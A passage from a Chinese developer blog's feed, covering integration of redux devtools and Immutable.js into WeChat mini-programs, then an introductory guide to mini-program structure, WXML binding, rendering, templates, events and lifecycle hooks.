class="literal">false</span></span><br><span class="line">  &#125;)));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = configureStore;</span><br></pre></td></tr></table></figure><blockquote><p>把<code>devtool</code>使用<code>redux</code>的<code>compose</code>加到<code>store</code>中去。<code>hostname</code>和<code>port</code>是指定为之前启动<code>remotedev-server</code>启动时候指定的参数。保存之后重启一下小程序，如果没有报错的话就OK了</p></blockquote><ul><li>可以在浏览器中访问<code>localhost:5678</code></li></ul><h3 id="四、小程序中集成immutable"><a href="#四、小程序中集成immutable" class="headerlink" title="四、小程序中集成immutable"></a>四、小程序中集成immutable</h3><blockquote><p><code>Immutable</code> 是 <code>Facebook</code> 开发的不可变数据集合。不可变数据一旦创建就不能被修改，是的应用开发更简单，允许使用函数式编程技术，比如惰性评估。微信小程序无法直接使用<code>Immutable.js</code>，下面就来说说微信小程序如何使用第三方库<code>Immutable.js</code></p></blockquote><p><strong>Immutable使用了UMD模块化规范</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params">global, factory</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">typeof</span> exports === <span class="string">'object'</span> &amp;&amp; <span class="keyword">typeof</span> <span class="built_in">module</span> !== <span class="string">'undefined'</span> ? <span class="built_in">module</span>.exports = factory() :</span><br><span class="line"> <span class="keyword">typeof</span> define === <span class="string">'function'</span> &amp;&amp; define.amd ? define(factory) :</span><br><span class="line"> (global.Immutable = factory());</span><br><span class="line">&#125;(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="string">'use strict'</span>;<span class="keyword">var</span> SLICE$<span class="number">0</span> = <span class="built_in">Array</span>.prototype.slice;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><blockquote><p>修改<code>Immutable</code>代码，注释原有模块导出语句，使用<code>module.exports = factory()</code> 强制导出</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">global, factory</span>) </span>&#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> typeof exports === 'object' &amp;&amp; typeof module !== 'undefined' ? module.exports = factory() :</span></span><br><span class="line"><span class="comment"> typeof define === 'function' &amp;&amp; define.amd ? define(factory) :</span></span><br><span class="line"><span class="comment"> (global.Immutable = factory());</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"> <span class="built_in">module</span>.exports = factory();</span><br><span class="line"></span><br><span class="line">&#125;(<span class="keyword">this</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br></pre></td></tr></table></figure><blockquote><p>导入修改好的<code>immutable</code>到小程序中即可 <a href="https://github.com/poetries/wx-redux-immutable-template/blob/master/wx-redux-immutable-template/public/libs/immutable.js" target="_blank" rel="noopener">https://github.com/poetries/wx-redux-immutable-template/blob/master/wx-redux-immutable-template/public/libs/immutable.js</a></p></blockquote><h3 id="五、小程序集成redux、immutable模板"><a href="#五、小程序集成redux、immutable模板" class="headerlink" title="五、小程序集成redux、immutable模板"></a>五、小程序集成redux、immutable模板</h3><blockquote><p><a href="https://github.com/poetries/wx-redux-immutable-template" target="_blank" rel="noopener">https://github.com/poetries/wx-redux-immutable-template</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;小程序给我们暴露了两个参数&lt;code&gt;require&lt;/code&gt;和&lt;code&gt;module&lt;/c
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="小程序" scheme="http://blog.poetries.top/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    
      <category term="redux" scheme="http://blog.poetries.top/tags/redux/"/>
    
  </entry>
  
  <entry>
    <title>小程序入门总结篇</title>
    <link href="http://blog.poetries.top/2018/08/09/xiaochengxu-note/"/>
    <id>http://blog.poetries.top/2018/08/09/xiaochengxu-note/</id>
    <published>2018-08-09T08:20:20.000Z</published>
    <updated>2018-08-23T01:41:37.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、小程序代码组成"><a href="#一、小程序代码组成" class="headerlink" title="一、小程序代码组成"></a>一、小程序代码组成</h2><p><img src="https://upload-images.jianshu.io/upload_images/1519620-e7b4608440bc35a5.png?imageMogr2/auto-orient/" alt=""></p><p><strong>须知</strong></p><ul><li><code>App()</code> 必须在 <code>app.js</code> 中注册，且不能注册多个。</li><li>编译后的代码包大小需小于 <code>1MB</code>，否则代码包将上传失败。</li><li>每个页面需要手动在<code>app.json</code>中进行注册，否则不能访问。</li><li><code>app.json</code>中<code>pages</code>数组的第一项代表小程序的初始页面，小程序中新增/减少页面，都需要对 <code>pages</code> 数组进行修改。</li><li>直接修改 <code>this.data</code>无效，无法改变页面的状态，还会造成数据不一致。</li><li>单次设置的数据不能超过<code>1024kB</code>，请尽量避免一次设置过多的数据。</li><li>不要尝试修改页面栈，会导致路由以及页面状态错误。</li><li><code>tabBar</code>只能配置最少2个、最多5个，<code>tab</code> 按数组的顺序排序。</li><li>小程序页面只能同时打开 5 个，如果交互流程较长难以支持。</li><li>同时只能存在 5 个<code>url</code>请求。</li><li>无法跳转小程序以外的<code>url</code>。</li><li>没有<code>cookie</code>。</li><li>没有开放加载<code>web</code>页面</li><li>没有a标签链接，不可嵌套<code>iframe</code></li><li>没有<code>window</code>变量，但微信提供了wx全局方法集</li><li>事件绑定和条件渲染类似<code>Angular</code>，全部写在<code>WXML</code>中</li></ul><h3 id="1-1-主体"><a href="#1-1-主体" class="headerlink" title="1.1 主体"></a>1.1 主体</h3><blockquote><p>由<code>app.js</code>、<code>app.json</code>、<code>app.wxss</code>三个文件组成，放在根目录</p></blockquote><ul><li><code>app.js</code> 根目录的<code>app.js</code>很有用,因为在它内部注册的变量或方法，都是可以被所有页面获取到。可以监听并处理小程序的生命周期、声明全局变量。其余的<code>.js</code>文 件可以通过<code>var app = getApp()</code> 获取其实例，调用其中定义的方法和变量，但不可以调用生命周期的方法</li><li><code>app.json</code>是小程序的全局配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pages 配置小程序的组成页面，第一个代表小程序的初始页面</span><br><span class="line">window  设置小程序的状态栏、标题栏、导航条、窗口背景颜色</span><br><span class="line">tabBar  配置小程序tab栏的样式和对应的页面</span><br></pre></td></tr></table></figure><ul><li><code>app.wxss</code> 是小程序的公共样式表，可以在其他<code>.wxss</code>文件中直接使用</li></ul><blockquote><p><code>app.json</code></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"pages"</span>: [ <span class="comment">//设置页面的路径</span></span><br><span class="line">  <span class="string">"pages/index/index"</span>, <span class="comment">//不需要写index.wxml,index.js,index,wxss,框架会自动寻找并整合</span></span><br><span class="line">  <span class="string">"pages/logs/logs"</span></span><br><span class="line">],</span><br><span class="line"><span class="string">"window"</span>: &#123; <span class="comment">//设置默认窗口的表现形式</span></span><br><span class="line">  <span class="string">"navigationBarBackgroundColor"</span>: <span class="string">"#ffffff"</span>, <span class="comment">//顶部导航栏背景色</span></span><br><span class="line">  <span class="string">"navigationBarTextStyle"</span>: <span class="string">"black"</span>, <span class="comment">//顶部导航文字的颜色 black/white</span></span><br><span class="line">  <span class="string">"navigationBarTitleText"</span>: <span class="string">"微信接口功能演示"</span>, <span class="comment">//顶部导航的显示文字</span></span><br><span class="line">  <span class="string">"backgroundColor"</span>: <span class="string">"#eeeeee"</span>, <span class="comment">//窗口的背景色</span></span><br><span class="line">  <span class="string">"backgroundTextStyle"</span>: <span class="string">"light"</span>, <span class="comment">//下拉背景字体、loading 图的样式，仅支持 dark/light</span></span><br><span class="line">  <span class="string">"enablePullDownRefresh"</span>: <span class="string">"false"</span>， <span class="comment">//是否支持下拉刷新 ，不支持的话就直接不写！</span></span><br><span class="line">  <span class="string">"disableScroll"</span>: <span class="literal">true</span>, <span class="comment">//  设置true不能上下滚动，true/false，注意！只能在 page.json 中有效，无法在 app.json 中设置该项。</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="string">"tabBar"</span>: &#123; <span class="comment">//底部tab或者顶部tab的表现，是个数组，最少配置2个，最多5个</span></span><br><span class="line">  <span class="string">"list"</span>: [&#123; <span class="comment">//设置tab的属性，最少2个，最多5个</span></span><br><span class="line">    <span class="string">"pagePath"</span>: <span class="string">"pages/index/index"</span>, <span class="comment">//点击底部 tab 跳转的路径</span></span><br><span class="line">    <span class="string">"text"</span>: <span class="string">"首页"</span>, <span class="comment">//tab 按钮上的文字</span></span><br><span class="line">    <span class="string">"iconPath"</span>: <span class="string">"../img/a.png"</span>, <span class="comment">//tab图片的路径</span></span><br><span class="line">    <span class="string">"selectedIconPath"</span>: <span class="string">"../img/a.png"</span> <span class="comment">//tab 在当前页，也就是选中状态的路径</span></span><br><span class="line">  &#125;, &#123;</span><br><span class="line">    <span class="string">"pagePath"</span>: <span class="string">"pages/logs/logs"</span>,</span><br><span class="line">    <span class="string">"text"</span>: <span class="string">"日志"</span></span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="string">"color"</span>: <span class="string">"red"</span>, <span class="comment">//tab 的字体颜色</span></span><br><span class="line">  <span class="string">"selectedColor"</span>: <span class="string">"#673ab7"</span>, <span class="comment">//当前页 tab 的颜色，也就是选中页的</span></span><br><span class="line">  <span class="string">"backgroundColor"</span>: <span class="string">"#2196f3"</span>, <span class="comment">//tab 的背景色</span></span><br><span class="line">  <span class="string">"borderStyle"</span>: <span class="string">"white"</span>, <span class="comment">//边框的颜色 black/white</span></span><br><span class="line">  <span class="string">"position"</span>: <span class="string">"bottom"</span> <span class="comment">//tab处于窗口的位置 top/bottom</span></span><br><span class="line">  &#125;,</span><br><span class="line"><span class="string">"networkTimeout"</span>: &#123; <span class="comment">//默认都是 60000 秒一分钟</span></span><br><span class="line">    <span class="string">"request"</span>: <span class="number">10000</span>, <span class="comment">//请求网络超时时间 10000 秒</span></span><br><span class="line">    <span class="string">"downloadFile"</span>: <span class="number">10000</span>， <span class="comment">//链接服务器超时时间 10000 秒</span></span><br><span class="line">      <span class="string">"uploadFile"</span>: <span class="string">"10000"</span>, <span class="comment">//上传图片 10000 秒</span></span><br><span class="line">    <span class="string">"downloadFile"</span>: <span class="string">"10000"</span> <span class="comment">//下载图片超时时间 10000 秒</span></span><br><span class="line">  &#125;,</span><br><span class="line"><span class="string">"debug"</span>: <span class="literal">true</span> <span class="comment">//项目上线后，建议关闭此项，或者不写此项</span></span><br></pre></td></tr></table></figure><h3 id="1-2-pages"><a href="#1-2-pages" class="headerlink" title="1.2 pages"></a>1.2 pages</h3><blockquote><p><code>pages</code>文件夹里是小程序的各个页面，每个界面一般都由<code>.wxml</code>、<code>.wxss</code>、<code>.js</code>、<code>.json</code>四个文件组成，四个文件必须是相同的名字和路径</p></blockquote><ul><li><code>.js</code> 是页面的脚本代码，通过<code>Page()</code>函数注册页面。可以指定页面的初始数据、生命周期、事件处理等 </li><li><code>.wxml</code> 是页面的布局文件，只能使用微信定义的组件 </li><li><code>.wxss</code> 是样式表，需要注意<ul><li>尺寸单位：<code>rpx</code> 可以根据屏幕的宽带进行自适应</li><li>样式导入：<code>@import</code>导入外联样式表，如：<code>@import &quot;test.wxss&quot;</code>;</li><li>定义在<code>app.wxss</code>中的全局样式，作用于每个页面。定义在<code>page</code>的<code>.wxss</code>文件只作用于对应的页面，会覆盖<code>app.wxss</code>中相同的选择器</li></ul></li><li><code>.json</code> 是页面的配置文件，只能设置<code>app.json</code>中的<code>window</code>配置内容，会覆盖<code>app.json</code>中<code>window</code>的相同配置项，即使不配置任何东西也需要写<code>{}</code>,否则会报错</li></ul><h3 id="1-3-utils"><a href="#1-3-utils" class="headerlink" title="1.3 utils"></a>1.3 utils</h3><blockquote><p><code>utils</code> 里面包含一些公共的代码抽取的<code>js</code>文件，作为模块方便使用。模块通过<code>module.exports</code>对外暴露接口</p></blockquote><ul><li>其他地方使用是<code>var utils = require(&#39;../../utils/util.js&#39;)</code> 进行引用</li></ul><h2 id="二、视图层-WXML"><a href="#二、视图层-WXML" class="headerlink" title="二、视图层 WXML"></a>二、视图层 WXML</h2><h3 id="2-1-数据绑定"><a href="#2-1-数据绑定" class="headerlink" title="2.1 数据绑定"></a>2.1 数据绑定</h3><blockquote><p>传统的视图和数据绑定</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1480597-5c24282ab5c92ea3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><strong>那么微信小程序是通过什么方法来管理视图和对象绑定的呢,状态模式-单向数据流</strong></p><p><img src="https://upload-images.jianshu.io/upload_images/1480597-1212f4ef9f8b9b86.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>数据流向是单向的，即视图变化不会影响对象状态</p></blockquote><ul><li>用户触发事件不仅要考虑当前<code>UI</code>元素更新，还会通过当前元素更新其他视图。</li><li>所以视图上的数据都必须用过事件传递给对象，只有用户操作视图，才能获取到数据，并更新对象状态</li></ul><p><img src="https://upload-images.jianshu.io/upload_images/1480597-cf9e543ac2446352.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p><code>.wxml</code> 中的动态数据都来自<code>Page</code>中的<code>data</code>。数据绑定使用数据绑定使用双大括号将变量包起来，可以作用于内容、组件属性(需要在双引号之内)、控制属性(需要在双引号之内)、关键字(需要在双引号之内)</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">    data: &#123;</span><br><span class="line">        message: <span class="string">"Hello"</span>,</span><br><span class="line">        id:<span class="number">0</span>,</span><br><span class="line">        status: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;view&gt; &#123;&#123;message&#125;&#125; &lt;/view&gt;</span><br><span class="line">&lt;view id=&quot;item-&#123;&#123;id&#125;&#125;&quot;&gt; &lt;/view&gt;</span><br><span class="line">&lt;view wx:if=&quot;&#123;&#123;status&#125;&#125;&quot;&gt; &lt;/view&gt;</span><br><span class="line">&lt;view hidden=&quot;&#123;&#123;status&#125;&#125;&quot;&gt; &lt;/checkbox&gt;</span><br></pre></td></tr></table></figure><blockquote><p>还可以进行简单的运算在大括号里</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;view hidden=&quot;&#123;&#123;status ? true : false&#125;&#125;&quot;&gt; Hidden &lt;/view&gt;</span><br><span class="line">&lt;view&gt; &#123;&#123;a + b&#125;&#125; + c &lt;/view&gt; </span><br><span class="line">&lt;view wx:if=&quot;&#123;&#123;num &gt; 6&#125;&#125;&quot;&gt; &lt;/view&gt;</span><br><span class="line">&lt;view&gt;&#123;&#123;&quot;hello&quot; + word&#125;&#125;&lt;/view&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-条件渲染"><a href="#2-2-条件渲染" class="headerlink" title="2.2 条件渲染"></a>2.2 条件渲染</h3><blockquote><p>用 <code>wx:if=””</code>来判断是否渲染代码块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;view wx:if=&quot;&#123;&#123;status&#125;&#125;&quot;&gt; isShow &lt;/view&gt;</span><br></pre></td></tr></table></figure><blockquote><p>还可以添加<code>else</code>块</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;view wx:if=&quot;&#123;&#123;num &gt; 5&#125;&#125;&quot;&gt; A &lt;/view&gt;</span><br><span class="line">&lt;view wx:elif=&quot;&#123;&#123;num &gt; 2&#125;&#125;&quot;&gt; B &lt;/view&gt;</span><br><span class="line">&lt;view wx:else&gt; C &lt;/view&gt;</span><br></pre></td></tr></table></figure><h3 id="2-3-列表渲染"><a href="#2-3-列表渲染" class="headerlink" title="2.3 列表渲染"></a>2.3 列表渲染</h3><ul><li>在组件上使用 <code>wx:for</code>属性绑定一个数组，就可以渲染组件了 </li><li>默认情况下数组的当前下标变量名为<code>index</code>,当前项的变量名为<code>item</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;view wx:for=&quot;&#123;&#123;array&#125;&#125;&quot;&gt;</span><br><span class="line">  &#123;&#123;index&#125;&#125;: &#123;&#123;item.message&#125;&#125;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Page(&#123;</span><br><span class="line">  data: &#123;</span><br><span class="line">    array: [<span class="string">"AA"</span>,<span class="string">"BB"</span>,<span class="string">"CC"</span>]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><p>使用 <code>wx:for-item</code> 可以指定数组当前元素的变量名，使用 <code>wx:for-index</code> 可以指定数组当前下标的变量名</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;view wx:for=&quot;&#123;&#123;array&#125;&#125;&quot; wx:for-index=&quot;num&quot; wx:for-item=&quot;itemName&quot;&gt;</span><br><span class="line">  &#123;&#123;num&#125;&#125;: &#123;&#123;itemName&#125;&#125;</span><br><span class="line">&lt;/view&gt;</span><br></pre></td></tr></table></figure><h3 id="2-4-模板template"><a href="#2-4-模板template" class="headerlink" title="2.4 模板template"></a>2.4 模板template</h3><ul><li><code>name</code> 定义组件模版的名称，引用模版的时候使用 <code>is</code> 属性指定模版的名字，<code>is</code> 可以进行简单的三目运算，需要传入模版需要的 <code>data</code> 数据。</li><li>因为模版拥有自己的作用域，所以只能使用 <code>data</code> 传入数据，而不接受双花括号的写法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;template name=&quot;msgItem&quot;&gt;</span><br><span class="line">&lt;view&gt;</span><br><span class="line">&lt;text&gt; &#123;&#123;index&#125;&#125;: &#123;&#123;msg&#125;&#125; &lt;/text&gt;</span><br><span class="line">&lt;text&gt; Time: &#123;&#123;time&#125;&#125; &lt;/text&gt;</span><br><span class="line">&lt;/view&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 其他代码 --&gt;</span><br><span class="line">&lt;template is=&quot;msgItem&quot; data=&quot;&#123;&#123;...item&#125;&#125;&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="2-5-公共模块的引用"><a href="#2-5-公共模块的引用" class="headerlink" title="2.5 公共模块的引用"></a>2.5 公共模块的引用</h3><ul><li><code>WXML</code> 提供 <code>import</code> 和 <code>include</code> 两种文件引用方式。</li><li><code>import</code> 有作用域的概念，不能多重引用</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- B.wxml --&gt;</span><br><span class="line">&lt;import src=&quot;a.wxml&quot;/&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- A.wxml --&gt;</span><br><span class="line">&lt;template name=&quot;A&quot;&gt;</span><br><span class="line"> &lt;text&gt; A template &lt;/text&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>include</code> 就可以多重引用</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--引用 header、其中 header.wxml 中也引用了 footer.wxml--&gt;</span><br><span class="line">&lt;include src=&quot;header.wxml&quot;/&gt;</span><br><span class="line">&lt;view&gt; body &lt;/view&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- header.wxml --&gt;</span><br><span class="line">&lt;view&gt; header &lt;/view&gt;</span><br><span class="line">&lt;include src=&quot;footer.wxml&quot;/&gt;</span><br></pre></td></tr></table></figure><h3 id="2-6-事件"><a href="#2-6-事件" class="headerlink" title="2.6 事件"></a>2.6 事件</h3><ul><li>名称以 <code>bind</code> 开头的事件不阻止冒泡，名称以 <code>catch</code> 开头的事件冒泡是阻止的。如 <code>bindTap</code> 和 <code>catchTab</code></li><li>在 <code>WXM</code>L 中，可以使用 <code>dataset</code> 定义<code>data</code>中的数据，会通过事件传递。它的事件以 <code>data-</code>开头，多个单词以 - 链接，如 <code>data-a-b</code></li></ul><h2 id="三、生命周期"><a href="#三、生命周期" class="headerlink" title="三、生命周期"></a>三、生命周期</h2><h3 id="3-1-App-应用生命周期"><a href="#3-1-App-应用生命周期" class="headerlink" title="3.1 App()应用生命周期"></a>3.1 App()应用生命周期</h3><p><img src="https://image-static.segmentfault.com/180/943/1809436873-58730c9dc69d2_articlex" alt=""></p><ul><li>用户首次打开小程序，触发 <code>onLaunch</code>（全局只触发一次）。</li><li>小程序初始化完成后，触发<code>onShow</code>方法，监听小程序显示。</li><li>小程序从前台进入后台，触发 <code>onHide</code>方法。</li><li>小程序从后台进入前台显示，触发 <code>onShow</code>方法。</li><li>小程序后台运行一定时间，或系统资源占用过高，会被销毁。</li><li>小程序出错，触发<code>onError</code></li></ul><blockquote><p>前台、后台定义： 当用户点击左上角关闭，或者按了设备 Home 键离开微信，小程序并没有直接销毁，而是进入了后台；当再次进入微信或再次打开小程序，又会从后台进入前台</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//app.js</span></span><br><span class="line">App(&#123;</span><br><span class="line">  onLaunch: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">      <span class="comment">//小程序初始化(全局只触发一次)</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onShow: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">//小程序显示</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onHide: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="comment">//小程序隐藏</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onError: <span class="function"><span class="keyword">function</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//小程序错误</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//其他 开发者可以添加任意的函数或数据到 Object 参数中，用 this 可以访问</span></span><br></pre></td></tr></table></figure><h3 id="3-2-Page页面生命周期"><a href="#3-2-Page页面生命周期" class="headerlink" title="3.2 Page页面生命周期"></a>3.2 Page页面生命周期</h3><blockquote><p>每个页面也有自己的生命周期</p></blockquote><p><img src="https://image-static.segmentfault.com/237/296/2372965507-58730caad9549_articlex" alt=""></p><ul><li>小程序注册完成后，加载页面，触发<code>onLoad</code>方法。</li><li>页面载入后触发<code>onShow</code>方法，显示页面。</li><li>首次显示页面，会触发<code>onReady</code>方法，渲染页面元素和样式，一个页面只会调用一次。</li><li>当小程序后台运行或跳转到其他页面时，触发<code>onHide</code>方法。</li><li>当小程序有后台进入到前台运行或重新进入页面时，触发<code>onShow</code>方法。</li><li>当使用重定向方法<code>wx.redirectTo(OBJECT)</code>或关闭当前页返回上一页<code>wx.navigateBack()</code>，触发<code>onUnload</code></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line">Page(&#123;</span><br><span class="line">  onLoad: <span class="function"><span class="keyword">function</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//页面加载-----(一个页面只会调用一次)</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onReady: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//页面渲染-----(一个页面只会调用一次)</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onShow: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//页面显示-----(每次打开页面都会调用一次)</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onHide: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//页面隐藏-----(当navigateTo或底部tab切换时调用)</span></span><br><span class="line">  &#125;,</span><br><span class="line">  onUnload: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//页面卸载-----(当redirectTo或navigateBack的时候调用)</span></span><br><span class="line">  &#125;,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">//其他 开发者可以添加任意的函数或数据到 object 参数中，在页面的函数中用 this 可以访问</span></span><br></pre></td></tr></table></figure><h3 id="3-3-应用生命周期影响页面生命周期"><a href="#3-3-应用生命周期影响页面生命周期" class="headerlink" title="3.3 应用生命周期影响页面生命周期"></a>3.3 应用生命周期影响页面生命周期</h3><p><img src="https://upload-images.jianshu.io/upload_images/1480597-ac90d7e8add10c54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><ul><li>小程序初始化完成后，页面首次加载触发<code>onLoad</code>，只会触发一次。</li><li>当小程序进入到后台，先执行页面<code>onHide</code>方法再执行应用<code>onHide</code>方法。</li><li>当小程序从后台进入到前台，先执行应用<code>onShow</code>方法再执行页面<code>onShow</code>方法</li></ul><h2 id="四、小程序限制"><a href="#四、小程序限制" class="headerlink" title="四、小程序限制"></a>四、小程序限制</h2><h3 id="4-1-程序限制"><a href="#4-1-程序限制" class="headerlink" title="4.1 程序限制"></a>4.1 程序限制</h3><ul><li>脚本内不能使用<code>window</code>等对象</li><li><code>zepto/jquery</code> 会使用到<code>window</code>对象和<code>document</code>对象，所以无法使用。</li><li>样式表不支持级联选择器</li><li>本地资源无法通过 <code>css</code> 获取 <code>background-image</code>可以使用网络图片，或者 <code>base64</code>，或者使用标签</li><li>不支持 <code>A</code> 标签，无法打开普通网页</li></ul><h3 